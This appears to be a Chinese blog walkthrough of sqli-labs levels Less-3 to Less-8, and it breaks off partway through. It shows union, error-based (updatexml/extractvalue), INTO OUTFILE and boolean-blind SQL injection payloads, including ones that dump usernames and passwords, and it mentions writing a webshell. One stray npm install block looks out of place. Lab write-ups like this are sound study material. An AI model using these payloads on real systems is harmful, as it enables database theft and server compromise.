<h3 id="Less-3-Single-quotes-with-twist"><a href="#Less-3-Single-quotes-with-twist" class="headerlink" title="Less-3 Single quotes with twist"></a>Less-3 <em>Single quotes with twist</em></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1  正常</span><br><span class="line">?id=1"  正常</span><br><span class="line">?id=2"  正常</span><br><span class="line">?id=1"--+  正常</span><br><span class="line">?id=9') //报错，如图</span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240710103912633.png" alt="image-20240710103912633"></p>
<p>可以判断是字符型注入，闭合方式是<code>')</code>。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-3</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">') and 1=1 --+</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712155019837.png" alt="image-20240712155019837"></p>
<p>其余与less-2相同。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-3</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">')--+</span></span><br><span class="line"><span class="string">Less-3/?id=1'</span>) <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></tbody></table></figure>

<p>回显位有三个。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-3</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">') and 1=2 union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span></span><br></pre></td></tr></tbody></table></figure>

<p>联合注入爆出库:<code>ctftraining</code>,<code>information_schema</code>,<code>mysql</code>,<code>performance_schema</code>,<code>security</code>,<code>test</code></p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-3</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">') and 1=2 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema='</span>ctftraining<span class="string">'--+</span></span><br></pre></td></tr></tbody></table></figure>

<p>联合注入爆出表:<code>flag</code>,<code>news</code>,<code>users</code></p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-3</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">') and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>flag<span class="string">'--+</span></span><br></pre></td></tr></tbody></table></figure>

<p>联合注入爆出列:<code>flag</code></p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-3</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">') and 1=2 union select 1,2,group_concat(flag) from ctftraining.flag--+</span></span><br></pre></td></tr></tbody></table></figure>

<p>联合注入爆出<code>flag</code>数据：flag{298646fa-c35b-4787-bd9b-40946f3fbddf}</p>
<h3 id="Less-4-Double-quotes"><a href="#Less-4-Double-quotes" class="headerlink" title="Less-4 Double quotes"></a>Less-4 <em>Double quotes</em></h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>		正常</span><br><span class="line">?id<span class="operator">=</span><span class="number">2</span><span class="number">-1</span>		回显和id<span class="operator">=</span><span class="number">2</span>一样，不是数字型</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'		正常</span></span><br><span class="line"><span class="string">?id=1"		报错'</span>"1"") LIMIT 0,1'        </span><br></pre></td></tr></tbody></table></figure>

<p>判断是字符型注入，闭合方式是<code>")</code>。</p>
<p>闭合：</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-4</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>") and 1=1 --+</span><br></pre></td></tr></tbody></table></figure>

<p>其余与less-2相同。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-4</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>")--+</span><br><span class="line">Less-4/?id=1") <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></tbody></table></figure>

<p>回显位有三个。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-4</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>") and 1=2 union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br></pre></td></tr></tbody></table></figure>

<p>联合注入爆出库：<code>ctftraining</code>,<code>information_schema</code>,<code>mysql</code>,<code>performance_schema</code>,<code>security</code>,<code>test</code></p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-4</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>") and 1=2 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema='ctftraining'--+</span><br></pre></td></tr></tbody></table></figure>

<p>联合注入爆出表:<code>flag</code>,<code>news</code>,<code>users</code></p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-4</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>") and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='flag'--+</span><br></pre></td></tr></tbody></table></figure>

<p>联合注入爆出列:<code>flag</code></p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-4</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>") and 1=2 union select 1,2,group_concat(flag) from ctftraining.flag--+</span><br></pre></td></tr></tbody></table></figure>

<p>联合注入爆出<code>flag</code>数据：flag{298646fa-c35b-4787-bd9b-40946f3fbddf}</p>
<h2 id="Double-Injection"><a href="#Double-Injection" class="headerlink" title="Double Injection"></a>Double Injection</h2><h3 id="Less-5-single-quotes"><a href="#Less-5-single-quotes" class="headerlink" title="Less-5 single quotes"></a>Less-5 <em>single quotes</em></h3><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><ul>
<li><code>extractvalue</code>:<br><code>extractvalue</code>函数用于从XML文档中提取特定的值。它接受两个参数，第一个参数是要提取值的XML文档，第二个参数是XPath表达式，用于指定要提取的值的位置。该函数将返回符合XPath表达式的节点的值。</li>
<li><code>updatexml</code><br><code>updatexml</code>函数用于更新XML文档中特定节点的值。它接受三个参数，第一个参数是要更新的XML文档，第二个参数是XPath表达式，用于指定要更新的节点的位置，第三个参数是新的节点值。该函数将返回更新后的XML文档。</li>
<li><code>floor</code><br><code>floor</code>函数用于向下取整，将一个数值向下取整为最接近的整数。它接受一个参数，即要进行取整操作的数值，返回最接近的小于或等于该数值的整数。例如，floor(3.8)将返回3，floor(4.2)将返回4。</li>
</ul>
<p>测出闭合和字段数</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>		回显You <span class="keyword">are</span> in...........</span><br><span class="line">?id<span class="operator">=</span><span class="number">2</span><span class="number">-1</span>		回显You <span class="keyword">are</span> in...........</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'		回显'</span>  <span class="string">'1'' LIMIT 0,1  '</span></span><br></pre></td></tr></tbody></table></figure>

<p>判断是字符型，<code>'</code>闭合。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">'  order by 3 --+</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711163239557.png" alt="image-20240711163239557"></p>
<p>回显位有三个。</p>
<p>尝试<code>union select</code>判断回显，无效；查询的字段多于3个后，页面报错。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711163308549.png" alt="image-20240711163308549"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711163323872.png" alt="image-20240711163323872"></p>
<p>尝试报错注入爆出数据库名。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+ </span></span><br></pre></td></tr></tbody></table></figure>

<p>或</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">' and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),3)--+		//推荐</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712173535319.png" alt="image-20240712173535319"></p>
<p>由于字符显示数量限制，只返回了两个完整的数据库名称：<code>ctftraining</code>,<code>information_schema</code>。</p>
<p>爆数据库表名：</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">' union select updatexml(1,concat(0x7e, (select(group_concat(table_name))from information_schema.tables where table_schema="ctftraining") ,0x7e),3)--+</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712173839011.png" alt="image-20240712173839011"></p>
<p>爆出表:<code>flag</code>,<code>news</code>,<code>users</code>。</p>
<p>利用数据库名+<code>inforamtion_schema</code>数据库进行后续注入。</p>
<p>爆字段名：</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">' union select updatexml(1,concat(0x7e, (select(group_concat(column_name))from information_schema.columns where table_name="flag") ,0x7e),3)--+</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712174059449.png" alt="image-20240712174059449"></p>
<p><code>flag</code></p>
<p>爆出数据：</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">' union select updatexml(1,concat(0x7e, left((select(group_concat(flag)) from ctftraining.flag) ,25),0x7e),3)--+</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712174246985.png" alt="image-20240712174246985"></p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">' union select updatexml(1,concat(0x7e, right((select(group_concat(flag)) from ctftraining.flag) ,25),0x7e),3)--+</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712174333303.png" alt="image-20240712174333303"></p>
<p>拼接，得出最终的flag数据：flag{5026a12e-9edf-481e-b</p>
<p><strong>注1</strong>：绕过字符串返回长度限制情况</p>
<table>
<thead>
<tr>
<th>序号</th>
<th align="center">函数</th>
<th align="center">实例</th>
<th align="center">截取内容</th>
<th align="center">返回结果</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td align="center">left（201809,4）</td>
<td align="center">SELECT LEFT(201809,4)</td>
<td align="center">左边的4个字符</td>
<td align="center">2018</td>
</tr>
<tr>
<td>2</td>
<td align="center">right（name,2）</td>
<td align="center">SELECT RIGHT(201809,2)</td>
<td align="center">右边的2个字符</td>
<td align="center">09</td>
</tr>
<tr>
<td>3</td>
<td align="center">SUBSTRING(name,5,3)</td>
<td align="center">SELECT SUBSTRING(‘福州大学计数学院’,5,3)</td>
<td align="center">name字段 从第五个字符开始截取之后的3个字符</td>
<td align="center">数学院</td>
</tr>
<tr>
<td>4</td>
<td align="center">SUBSTRING(name,3)</td>
<td align="center">SELECT SUBSTRING(‘福州大学计数学院’,3)</td>
<td align="center">name字段 从第三个字符开始之后的所有字符</td>
<td align="center">大学计数学院</td>
</tr>
<tr>
<td>5</td>
<td align="center">SUBSTRING(name, -4)</td>
<td align="center">SELECT SUBSTRING(‘福州大学计数学院’,-4)</td>
<td align="center">name字段的第 4 个字符位置（倒数）开始取直到结束</td>
<td align="center">计数学院</td>
</tr>
<tr>
<td>6</td>
<td align="center">SUBSTRING(name, -4，2)</td>
<td align="center">SELECT SUBSTRING(‘福州大学计数学院’,-4,2)</td>
<td align="center">name这个字段的第 4 个字符位置（倒数）开始截取之后的2个字符</td>
<td align="center">计数</td>
</tr>
<tr>
<td>7</td>
<td align="center">substring_index(‘<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>‘, ‘.’, 2)</td>
<td align="center">SELECT substring_index(‘<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>‘, ‘.’, 2)</td>
<td align="center">第二个 ‘.’ 之前的所有字符</td>
<td align="center"><a target="_blank" rel="noopener" href="http://www.baidu/">www.baidu</a></td>
</tr>
<tr>
<td>8</td>
<td align="center">substring_index(‘<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>‘, ‘.’, -2)</td>
<td align="center">SELECT substring_index(‘<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>‘, ‘.’, -2)</td>
<td align="center">第二个 ‘.’ （倒数）之后的所有字符</td>
<td align="center">baidu.com</td>
</tr>
<tr>
<td>9</td>
<td align="center">SUBSTR(name, 1, CHAR_LENGTH(name)-3)</td>
<td align="center">SELECT SUBSTR(‘福州大学计数学院’, 1, CHAR_LENGTH(‘福州大学计数学院’)-3)</td>
<td align="center">name字段 除name字段后三位的所有字符</td>
<td align="center">福州大学计</td>
</tr>
<tr>
<td>10</td>
<td align="center">mid(str,start,[length])</td>
<td align="center"></td>
<td align="center">str:截取的字符串<br>start:起始位置<br>length:截取的长度，可以忽略</td>
<td align="center"></td>
</tr>
</tbody></table>
<p>​	我们注意到在函数 substring(str,pos, len)中， pos 可以是负值，但 len 不能取负值。</p>
<p><strong>注2</strong>：使用updatexml来查询表中数据时可能会出现查询数据不完整的问题。</p>
<p>解决方案：</p>
<ul>
<li>使用limit限制查询个数，一个一个查询</li>
<li>使用group_concat时使用substr进行字符串截取 其中”1，32”控制截取的起始与结束位置</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712172139323.png" alt="image-20240712172139323"></p>
<p>payload：</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>  updatexml(<span class="number">1</span>,(<span class="keyword">select</span> concat(username,<span class="number">0x7e</span>,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line"><span class="keyword">and</span>  updatexml(<span class="number">1</span>,(<span class="keyword">select</span> substr((group_concat(username,<span class="number">0x7e</span>,password)),<span class="number">1</span>,<span class="number">32</span>) <span class="keyword">from</span> users),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711163704387.png" alt="image-20240711163704387"></p>
<h3 id="Less-6-Double-quotes"><a href="#Less-6-Double-quotes" class="headerlink" title="Less-6 Double quotes"></a>Less-6 <em>Double quotes</em></h3><blockquote>
<p>与Less-5只是闭合的方式不同，需要闭合<code>"</code>。直接参考Less-5的payload。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/HolyBeagle/AppData/Roaming/Typora/typora-user-images/image-20240712210240457.png" alt="image-20240712210240457"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/HolyBeagle/AppData/Roaming/Typora/typora-user-images/image-20240712210756082.png" alt="image-20240712210756082"></p>
<p>flag{5eda00d5-53df-4655-9c24-18747e835c94}</p>
<h2 id="Dump-into-outfile"><a href="#Dump-into-outfile" class="headerlink" title="Dump into outfile"></a>Dump into outfile</h2><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1                  You are in.... Use outfile......提示用文件</span><br><span class="line">?id=1'''''             回显You have an error in your SQL syntax，不告诉我们哪里错了，看不见闭合</span><br><span class="line">?id=1'--+              回显You have an error in your SQL syntax</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">?id=1'))--+            You are in.... Use outfile...... </span><br></pre></td></tr></tbody></table></figure>

<p>则试出字符型注入，闭合是<code>'))</code></p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-7</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">')) --+</span></span><br></pre></td></tr></tbody></table></figure>

<p>尝试使用<code>updatexml()</code>报错注入函数尝试注入</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-7</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">'))  and updatexml(1,concat(0x7e,databse(),0x7e),3)--+</span></span><br></pre></td></tr></tbody></table></figure>

<p>注入失败，出现语法报错。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712155710129.png" alt="image-20240712155710129"></p>
<p>传参id=1时出现提示：使用输入/输出文件。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711164019702.png" alt="image-20240711164019702"></p>
<h4 id="写马"><a href="#写马" class="headerlink" title="写马"></a>写马</h4><p>通过mysql的<code>file</code>系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有：</p>
<p><code>into dumpfile()</code><br><code>into outfile()</code><br><code>load_file()</code></p>
<p>用法：</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'mysql is very good'</span> <span class="keyword">into</span> outfile <span class="string">'test1.txt'</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>成功实现的条件：</p>
<ol>
<li>权限为root</li>
<li>知道网站的物理路径</li>
<li><code>secure_file_priv</code>=空</li>
</ol>
<h4 id="show-variables-like-‘-secure-’"><a href="#show-variables-like-‘-secure-’" class="headerlink" title="show variables like ‘%secure%’;"></a>show variables like ‘%secure%’;</h4><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install show	</span><br></pre></td></tr></tbody></table></figure>

<p>编辑进环境变量PATH，尝试在mysql控制台通过命令  <code>show variables like '%secure%';</code> 查看 <code>secure-file-priv</code> 当前的值。</p>
<p>出现报错：</p>
<figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fs.js:<span class="number">43</span></span><br><span class="line">} = primordials;</span><br><span class="line">    ^</span><br><span class="line"></span><br><span class="line">ReferenceError: primordials is not defined</span><br><span class="line">    at fs.js:<span class="number">43</span>:<span class="number">5</span></span><br><span class="line">    at req_ </span><br><span class="line">    ...</span><br><span class="line">Node.js v20.<span class="number">10.0</span></span><br></pre></td></tr></tbody></table></figure>

<p>出现报错的原因是</p>
<p>​	如果显示为<code>NULL</code>，则需要将其设置为物理服务器地址路径/路径设置为空，才可以导出文件到指定位置。在<code>my.ini</code>文件里修改此项，改为<code>secure-file-priv=' '</code>，表示不限制mysql在任意目录的导入导出。</p>
<p>在Less-7中我们可以这样尝试将一个txt文件来写入到服务的目录中：</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-7</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">')) union select 1,2,group_concat(schema_name) from information_schema.schemata into outfile "/var/www/html/1.txt"--+</span></span><br></pre></td></tr></tbody></table></figure>

<p>爆库： ctftraining</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-7</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">')) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema='</span>ctftraining<span class="string">' into outfile "/var/www/html/2.txt"--+ </span></span><br></pre></td></tr></tbody></table></figure>

<p>爆表：flag</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-7</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">')) union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>flagdk<span class="string">' into outfile "/var/www/html/3.txt"--+ </span></span><br></pre></td></tr></tbody></table></figure>

<p>爆列： flag</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-7</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">')) union select 1,2,group_concat(flag43) from ctfshow.flagdk into outfile "/var/www/html/4.txt"--+ </span></span><br></pre></td></tr></tbody></table></figure>

<p>获取字段值（flag）：</p>
<h2 id="Blind"><a href="#Blind" class="headerlink" title="Blind"></a>Blind</h2><h3 id="Less-8-Boolian-Based"><a href="#Less-8-Boolian-Based" class="headerlink" title="Less-8 Boolian Based"></a>Less-8 <em>Boolian Based</em></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1                  You are in.... </span><br><span class="line">?id=1'''''             无回显，看不见报错</span><br><span class="line">?id=1'--+              无回显，看不见报错</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">?id=1"--+              You are in....</span><br></pre></td></tr></tbody></table></figure>

<p>尝试可知是字符型注入，闭合是<code>"</code>，但是页面不显示报错。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">'))</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>当服务器不显示查询结果，只返回是否查询成功时，我们就无法使用union直接回显数据，需要进行盲注。可以通过<strong>布尔盲注</strong>来不断尝试猜测出数据。</p>
<h5 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h5><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">' and (select length(database())&gt;1) and 1=1  --+ //true</span></span><br><span class="line"><span class="string">Less-8/?id=1'</span> <span class="keyword">and</span> (<span class="keyword">select</span> length(database())<span class="operator">&gt;</span><span class="number">10</span>) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>  <span class="comment">--+  //false</span></span><br><span class="line">Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">' and (select length(database())&gt;5) and 1=1  --+ //true</span></span><br><span class="line"><span class="string">Less-8/?id=1'</span> <span class="keyword">and</span> (<span class="keyword">select</span> length(database())<span class="operator">&gt;</span><span class="number">6</span>) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>  <span class="comment">--+ //true</span></span><br><span class="line">Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">' and (select length(database())&gt;8) and 1=1  --+ //false</span></span><br></pre></td></tr></tbody></table></figure>

<p>通过页面的不同响应页面来判断数据库的长度是否是我们所指定的范围，最终可以得到数据库的名称的长度为7。</p>
<p>得到了数据库的长度后，我们就可以再利用ascii函数+substr函数来修改字符串的范围，最终判断数据库的各个字符的ascii的值，最终就可以得到完整的数据库名称。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">' and ((select ascii(substr(database(),1,1)))&gt;100) and 1=1 --+ //true</span></span><br><span class="line"><span class="string">Less-8/?id=1'</span> <span class="keyword">and</span> ((<span class="keyword">select</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">&gt;</span><span class="number">200</span>) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--+ //false</span></span><br><span class="line">...</span><br><span class="line">Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span 